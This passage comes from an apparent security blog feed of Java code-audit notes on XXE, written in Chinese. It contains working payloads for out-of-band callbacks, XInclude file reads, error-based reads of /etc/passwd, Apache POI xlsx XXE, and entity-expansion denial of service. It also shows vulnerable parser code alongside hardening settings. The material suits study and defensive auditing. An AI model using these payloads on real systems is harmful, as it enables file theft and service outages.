src="https://img-blog.csdnimg.cn/20200221160503214.png#pic_center" alt="在这里插入图片描述"><br><em><code>if (child.item(j).getNodeType() == Node.ELEMENT_NODE)</code></em><br> 正常解析XML，需要判断是否是ELEMENT_NODE类型。否则会出现多余的的节点。</p><hr><p>对于这样子无回显的验证可以使用ceye.io网站，具体方法：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">joychou</span> [</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"http://ip.port.xxxx.ceye.io/xxe_test"</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200222193843204.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200222193929997.png" alt="在这里插入图片描述"><br>&emsp;&emsp; 复测过程中遇见的小坑，个人感觉纯属玄学问题。两次请求数据几乎是一模一样的，但是返回结果愣是不一样，一个200一个400。（充分体现了挖洞得随缘，有时候姿势对了，但是结果不对可能不是你的错误）<br><img src="https://img-blog.csdnimg.cn/20200222194626447.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200222194755884.png" alt="在这里插入图片描述"></p><hr><h1 id="Xinclude"><a href="#Xinclude" class="headerlink" title="Xinclude"></a>Xinclude</h1><p><strong>什么是xinclude</strong><br>&emsp;&emsp; 顾名思义，xinclude可以理解为xml include熟悉编译/脚本语言的一定熟知，像php的include，python和java的import都是可以进行文件包含的。<br><strong>那么文件包含有什么好处？</strong><br>&emsp;&emsp; 当然是可以使代码更整洁，我们可以将定义的功能函数放在function.php中，再在需要使用功能函数的文件中使用include包含function.php，这样就避免了重复冗余的函数定义，同样可以增加代码的可读性。故此，xinclude也不例外，它是xml标记语言中包含其他文件的方式。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" ?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span> <span class="attr">xmlns:xi</span>=<span class="string">"http://www.w3.org/2001/XInclude"</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">xi:include</span> <span class="attr">href</span>=<span class="string">"file:///E:/1.txt"</span> <span class="attr">parse</span>=<span class="string">"text"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200222211644240.png" alt="在这里插入图片描述"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">xxe_xinclude_DocumentBuilder</span><span class="params">(HttpServletRequest request)</span> </span>&#123;</span><br><span class="line">       <span class="keyword">try</span> &#123;</span><br><span class="line">           String xml_con = WebUtils.getRequestBody(request);</span><br><span class="line">           System.out.println(xml_con);</span><br><span class="line"></span><br><span class="line">           DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();</span><br><span class="line">           dbf.setXIncludeAware(<span class="keyword">true</span>);   <span class="comment">// 支持XInclude</span></span><br><span class="line">           dbf.setNamespaceAware(<span class="keyword">true</span>);  <span class="comment">// 支持XInclude</span></span><br><span class="line">           DocumentBuilder db = dbf.newDocumentBuilder();</span><br><span class="line">           StringReader sr = <span class="keyword">new</span> StringReader(xml_con);</span><br><span class="line">           InputSource is = <span class="keyword">new</span> InputSource(sr);</span><br><span class="line">           Document document = db.parse(is);  <span class="comment">// parse xml</span></span><br><span class="line"></span><br><span class="line">           NodeList rootNodeList = document.getChildNodes();</span><br><span class="line">           String str = <span class="keyword">new</span> String();</span><br><span class="line">           <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; rootNodeList.getLength(); i++) &#123;</span><br><span class="line">               Node rootNode = rootNodeList.item(i);</span><br><span class="line">               NodeList xxe = rootNode.getChildNodes();</span><br><span class="line">               <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; xxe.getLength(); j++) &#123;</span><br><span class="line">                   Node xxeNode = xxe.item(j);</span><br><span class="line">             </span><br><span class="line">                   str = str + xxeNode.getNodeValue();</span><br><span class="line">                   System.out.println(str);</span><br><span class="line">               &#125;</span><br><span class="line"></span><br><span class="line">           &#125;</span><br><span class="line"></span><br><span class="line">           sr.close();</span><br><span class="line">           <span class="keyword">return</span> str;</span><br><span class="line">       &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">           System.out.println(e);</span><br><span class="line">           <span class="keyword">return</span> <span class="string">"except"</span>;</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><hr><h2 id="Payload分享"><a href="#Payload分享" class="headerlink" title="Payload分享"></a>Payload分享</h2><p>飘零师傅的payload：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">resetPassword</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">local_dtd</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"file:///usr/share/xml/fontconfig/fonts.dtd"</span>&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">expr</span> <span class="meta-string">'aaa)&gt;</span></span></span></span><br><span class="line"><span class="meta"><span class="meta"><span class="meta-string">&lt;!ENTITY &amp;#x25; file SYSTEM "file:///flag"&gt;</span></span></span></span><br><span class="line"><span class="meta"><span class="meta"><span class="meta-string">&lt;!ENTITY &amp;#x25; eval "&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:////&amp;#x25;file;&amp;#x27;&gt;"&gt;</span></span></span></span><br><span class="line"><span class="meta"><span class="meta"><span class="meta-string">&amp;#x25;eval;</span></span></span></span><br><span class="line"><span class="meta"><span class="meta"><span class="meta-string">&amp;#x25;error;</span></span></span></span><br><span class="line"><span class="meta"><span class="meta"><span class="meta-string">&lt;!ELEMENT aa (bb'</span>&gt;</span></span></span><br><span class="line"><span class="meta">    %local_dtd;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">request</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">status</span>&gt;</span><span class="symbol">&amp;data;</span><span class="tag">&lt;/<span class="name">status</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">request</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">message</span> [</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY % <span class="meta-keyword">local_dtd</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"file:///usr/share/yelp/dtd/docbookx.dtd"</span>&gt;</span></span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY % <span class="meta-keyword">ISOamso</span> <span class="meta-string">'</span></span></span></span><br><span class="line"><span class="meta"><span class="meta"><span class="meta-string">        &lt;!ENTITY % file SYSTEM "file:///etc/passwd"&gt;</span></span></span></span><br><span class="line"><span class="meta"><span class="meta"><span class="meta-string">        &lt;!ENTITY % eval "&lt;!ENTITY % error SYSTEM '</span>file:///nonexistent/%file;<span class="meta-string">'&gt;"&gt;</span></span></span></span><br><span class="line"><span class="meta"><span class="meta"><span class="meta-string">        %eval;</span></span></span></span><br><span class="line"><span class="meta"><span class="meta"><span class="meta-string">        %error;</span></span></span></span><br><span class="line"><span class="meta"><span class="meta"><span class="meta-string">    '</span>&gt;</span></span></span><br><span class="line"><span class="meta">    %local_dtd;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br></pre></td></tr></table></figure><hr><h1 id="Poi-ooxml-XXE"><a href="#Poi-ooxml-XXE" class="headerlink" title="Poi ooxml XXE"></a>Poi ooxml XXE</h1><h2 id="CVE-2014-3529"><a href="#CVE-2014-3529" class="headerlink" title="CVE-2014-3529"></a>CVE-2014-3529</h2><ul><li><p>新建xxe.xlsx文件，修改后缀名xxe.zip解压。<br><img src="https://img-blog.csdnimg.cn/2020022311395424.png" alt="在这里插入图片描述"></p></li><li><p>修改[Content-Types].xml</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE x [ <span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"http://xxxxx.xx.ixxo"</span>&gt;</span> ]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">x</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">x</span>&gt;</span></span><br></pre></td></tr></table></figure><p><code>后因为无法访问ceye.io网站，笔者自己在本地搭建一台服务器。推荐使用phpstudy，开启访问日志，具体方法百度。</code><br><img src="https://img-blog.csdnimg.cn/20200223113339623.png" alt="在这里插入图片描述"></p></li><li><p>重新压缩成zip，在修改成xlsx文件。</p></li><li><p>上传文件<br><img src="https://img-blog.csdnimg.cn/20200223140541747.png" alt="在这里插入图片描述"></p></li><li><p>或者直接读取文件。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">File f = <span class="keyword">new</span> File(<span class="string">"/path/xxe.xlsx"</span>);</span><br><span class="line">        FileInputStream in = <span class="keyword">new</span> FileInputStream(f);</span><br><span class="line"></span><br><span class="line">        XSSFWorkbook wb = <span class="keyword">new</span> XSSFWorkbook(in); <span class="comment">// xxe vuln</span></span><br><span class="line">        XSSFSheet sheet = wb.getSheetAt(<span class="number">0</span>);</span><br><span class="line">        <span class="keyword">int</span> total = sheet.getLastRowNum();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (Row row : sheet)&#123;</span><br><span class="line">            <span class="keyword">for</span> (Cell cell :row)&#123;</span><br><span class="line">               System.out.println(cell.getStringCellValue());</span><br><span class="line">            &#125;</span><br><span class="line">            System.out.println(<span class="string">"expection"</span>);</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure></li><li><p>看下报错，报出poi错误才是正确的。<br><img src="https://img-blog.csdnimg.cn/20200223140830833.png" alt="在这里插入图片描述"></p></li><li><p>查看访问记录<br><img src="https://img-blog.csdnimg.cn/20200223141207658.png" alt="在这里插入图片描述"></p></li><li><p>修复建议，换成3.10-FINAL版本以上<br><img src="https://img-blog.csdnimg.cn/20200223141417847.png" alt="在这里插入图片描述"></p></li></ul><hr><h2 id="CVE-2017-5644"><a href="#CVE-2017-5644" class="headerlink" title="CVE-2017-5644"></a>CVE-2017-5644</h2><p>其他步骤同CVE-2014-3529中的方式，这次是在 xl/workbook.xml 中注入实体:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE x [     </span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY <span class="meta-keyword">e1</span> <span class="meta-string">""</span>&gt;</span></span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY <span class="meta-keyword">e2</span> <span class="meta-string">"&amp;e1;&amp;e1;&amp;e1;&amp;e1;&amp;e1;&amp;e1;&amp;e1;&amp;e1;&amp;e1;&amp;e1;&amp;e1;&amp;e1;&amp;e1;&amp;e1;&amp;e1;&amp;e1;&amp;e1;&amp;e1;&amp;e1;&amp;e1;"</span>&gt;</span></span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY <span class="meta-keyword">e3</span> <span class="meta-string">"&amp;e2;&amp;e2;&amp;e2;&amp;e2;&amp;e2;&amp;e2;&amp;e2;&amp;e2;&amp;e2;&amp;e2;&amp;e2;&amp;e2;&amp;e2;&amp;e2;&amp;e2;&amp;e2;&amp;e2;&amp;e2;&amp;e2;&amp;e2;"</span>&gt;</span></span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY <span class="meta-keyword">e4</span> <span class="meta-string">"&amp;e3;&amp;e3;&amp;e3;&amp;e3;&amp;e3;&amp;e3;&amp;e3;&amp;e3;&amp;e3;&amp;e3;&amp;e3;&amp;e3;&amp;e3;&amp;e3;&amp;e3;&amp;e3;&amp;e3;&amp;e3;&amp;e3;&amp;e3;"</span>&gt;</span></span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY <span class="meta-keyword">e5</span> <span class="meta-string">"&amp;e4;&amp;e4;&amp;e4;&amp;e4;&amp;e4;&amp;e4;&amp;e4;&amp;e4;&amp;e4;&amp;e4;&amp;e4;&amp;e4;&amp;e4;&amp;e4;&amp;e4;&amp;e4;&amp;e4;&amp;e4;&amp;e4;&amp;e4;"</span>&gt;</span></span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY <span class="meta-keyword">e6</span> <span class="meta-string">"&amp;e5;&amp;e5;&amp;e5;&amp;e5;&amp;e5;&amp;e5;&amp;e5;&amp;e5;&amp;e5;&amp;e5;&amp;e5;&amp;e5;&amp;e5;&amp;e5;&amp;e5;&amp;e5;&amp;e5;&amp;e5;&amp;e5;&amp;e5;"</span>&gt;</span></span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY <span class="meta-keyword">e7</span> <span class="meta-string">"&amp;e6;&amp;e6;&amp;e6;&amp;e6;&amp;e6;&amp;e6;&amp;e6;&amp;e6;&amp;e6;&amp;e6;&amp;e6;&amp;e6;&amp;e6;&amp;e6;&amp;e6;&amp;e6;&amp;e6;&amp;e6;&amp;e6;&amp;e6;"</span>&gt;</span></span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY <span class="meta-keyword">e8</span> <span class="meta-string">"&amp;e7;&amp;e7;&amp;e7;&amp;e7;&amp;e7;&amp;e7;&amp;e7;&amp;e7;&amp;e7;&amp;e7;&amp;e7;&amp;e7;&amp;e7;&amp;e7;&amp;e7;&amp;e7;&amp;e7;&amp;e7;&amp;e7;&amp;e7;"</span>&gt;</span></span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY <span class="meta-keyword">e9</span> <span class="meta-string">"&amp;e8;&amp;e8;&amp;e8;&amp;e8;&amp;e8;&amp;e8;&amp;e8;&amp;e8;&amp;e8;&amp;e8;&amp;e8;&amp;e8;&amp;e8;&amp;e8;&amp;e8;&amp;e8;&amp;e8;&amp;e8;&amp;e8;&amp;e8;"</span>&gt;</span></span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY <span class="meta-keyword">e1</span>0 <span class="meta-string">"&amp;e9;&amp;e9;&amp;e9;&amp;e9;&amp;e9;&amp;e9;&amp;e9;&amp;e9;&amp;e9;&amp;e9;&amp;e9;&amp;e9;&amp;e9;&amp;e9;&amp;e9;&amp;e9;&amp;e9;&amp;e9;&amp;e9;&amp;e9;"</span>&gt;</span></span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY <span class="meta-keyword">e11</span> <span class="meta-string">"&amp;e10;&amp;e10;&amp;e10;&amp;e10;&amp;e10;&amp;e10;&amp;e10;&amp;e10;&amp;e10;&amp;e10;&amp;e10;&amp;e10;&amp;e10;&amp;e10;&amp;e10;&amp;e10;"</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">x</span>&gt;</span>&amp;e11;<span class="tag">&lt;/<span class="name">x</span>&gt;</span></span><br></pre></td></tr></table></figure><p>&emsp;&emsp; &lt;x&gt;&e11;&lt;/x&gt; 代码引用ENTITY e11，而 e11 由16 个 e10 组成，递归调用，循环次数达到 16^10 的规模。循环大量的实体引用，会消耗大量的CPU资源，长时间显示占用近100%。</p><p>&emsp;&emsp; POIXMLTypeLoader 中，解析xml的时候直接读取xml，没有对实体的数量进行限制。3.11 对 POIXMLTypeLoader 中的实体大小进行了限制 ，最大为4096，但是当实体为空的时候（如上例），还是可以构造空实体，形成大量循环，占用 cpu 资源，造成拒绝服务攻击。</p><hr><h1 id="xlsx-streamer-XXE"><a href="#xlsx-streamer-XXE" class="headerlink" title="xlsx-streamer XXE"></a>xlsx-streamer XXE</h1><p>&emsp;&emsp; xlsx-streamer XXE漏洞与Poi ooxml XXE类似，具体查看<a href="https://www.itread01.com/hkpcyyp.html" target="_blank" rel="noopener">参考链接</a>笔者这里就不过多的叙述了。</p><hr><h1 id="代码审计技巧"><a href="#代码审计技巧" class="headerlink" title="代码审计技巧"></a>代码审计技巧</h1><p><strong>查找关键字</strong></p><pre><code>javax.xml.parsers.DocumentBuilderFactory;javax.xml.parsers.SAXParserjavax.xml.transform.TransformerFactoryjavax.xml.validation.Validatorjavax.xml.validation.SchemaFactoryjavax.xml.transform.sax.SAXTransformerFactoryjavax.xml.transform.sax.SAXSourceorg.xml.sax.XMLReaderorg.xml.sax.helpers.XMLReaderFactoryorg.dom4j.io.SAXReaderorg.jdom.input.SAXBuilderorg.jdom2.input.SAXBuilderjavax.xml.bind.Unmarshallerjavax.xml.xpath.XpathExpressionjavax.xml.stream.XMLStreamReaderorg.apache.commons.digester3.Digester…………</code></pre><hr><h1 id="XXE防御"><a href="#XXE防御" class="headerlink" title="XXE防御"></a>XXE防御</h1><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//一般的防护</span></span><br><span class="line">DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();</span><br><span class="line">            dbf.setFeature(<span class="string">"http://apache.org/xml/features/disallow-doctype-decl"</span>, <span class="keyword">true</span>);</span><br><span class="line">            dbf.setFeature(<span class="string">"http://xml.org/sax/features/external-general-entities"</span>, <span class="keyword">false</span>);</span><br><span class="line">            dbf.setFeature(<span class="string">"http://xml.org/sax/features/external-parameter-entities"</span>, <span class="keyword">false</span>);</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//xinclude防护</span></span><br><span class="line">dbf.setXIncludeAware(<span class="keyword">true</span>);   <span class="comment">// 支持XInclude</span></span><br><span class="line">            dbf.setNamespaceAware(<span class="keyword">true</span>);  <span class="comment">// 支持XInclude</span></span><br><span class="line">            dbf.setFeature(<span class="string">"http://apache.org/xml/features/disallow-doctype-decl"</span>, <span class="keyword">true</span>);</span><br><span class="line">            dbf.setFeature(<span class="string">"http://xml.org/sax/features/external-general-entities"</span>, <span class="keyword">false</span>);</span><br><span class="line">            dbf.setFeature(<span class="string">"http://xml.org/sax/features/external-parameter-entities"</span>, <span class="keyword">false</span>);</span><br></pre></td></tr></table></figure><hr><h1 id="推荐案例"><a href="#推荐案例" class="headerlink" title="推荐案例"></a>推荐案例</h1><p><a href="https://www.cnblogs.com/backlion/p/9302528.html" target="_blank" rel="noopener">收集了很多国内外知名厂商出现案例</a><br><a href="https://www.freebuf.com/column/156863.html" target="_blank" rel="noopener">基础知识文章XXE</a><br><a href="https://xz.aliyun.com/t/3357" target="_blank" rel="noopener">XXE更多骚操作</a><br><a href="https://xz.aliyun.com/t/2448" target="_blank" rel="noopener">Apache Solr XXE漏洞分析 -【CVE-2018-8026 】</a></p><hr><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://blog.csdn.net/weixin_40918067/article/details/90950535" target="_blank" rel="noopener">https://blog.csdn.net/weixin_40918067/article/details/90950535</a><br><a href="https://github.com/JoyChou93/java-sec-code/wiki/XXE" target="_blank" rel="noopener">https://github.com/JoyChou93/java-sec-code/wiki/XXE</a><br><a href="https://blog.csdn.net/hua1017177499/article/details/78985166" target="_blank" rel="noopener">https://blog.csdn.net/hua1017177499/article/details/78985166</a><br><a href="https://p0rz9.github.io/2019/02/27/xxe/" target="_blank" rel="noopener">https://p0rz9.github.io/2019/02/27/xxe/</a><br><a href="https://www.anquanke.com/post/id/156227" target="_blank" rel="noopener">https://www.anquanke.com/post/id/156227</a><br><a href="https://www.jianshu.com/p/73cd11d83c30" target="_blank" rel="noopener">https://www.jianshu.com/p/73cd11d83c30</a><br><a href="https://www.itread01.com/hkpcyyp.html" target="_blank" rel="noopener">https://www.itread01.com/hkpcyyp.html</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;ul&gt;
&lt;li&gt;学习总结Java审计过程中笔记，审计方法&lt;/li&gt;
&lt;li&gt;阅读要求：有简单Java代码基础，了解漏洞原理&lt;/li&gt;
&lt;li&gt;阅
      
    
    </summary>
    
    
      <category term="总结" scheme="https://summersec.github.io/categories/%E6%80%BB%E7%BB%93/"/>
    
    
      <category term="XXE 代码审计" scheme="https://summersec.github.io/tags/XXE-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
</feed>
